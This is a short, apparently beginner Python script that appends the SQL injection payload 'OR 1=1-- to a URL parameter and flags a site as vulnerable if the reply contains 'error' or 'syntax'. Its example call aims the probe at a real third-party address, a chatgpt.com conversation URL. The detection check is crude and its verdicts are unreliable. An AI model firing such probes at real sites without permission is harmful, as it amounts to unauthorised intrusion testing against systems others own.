sql_velnurablity

import requests

def sql_injection_url(url,param):
    payload=f"{url}?{param}='OR 1=1--"
    response=requests.get(payload)
    if "error" in response.text or "syntax" in response.text:
        print(f"potential vulnerablilities:{payload}")
        
    else:
        print(f"seems safe:{url}")


sql_injection_url("https://chatgpt.com/c/691b3b84-f3f0-8322-94d6-572bc66d8232","login")
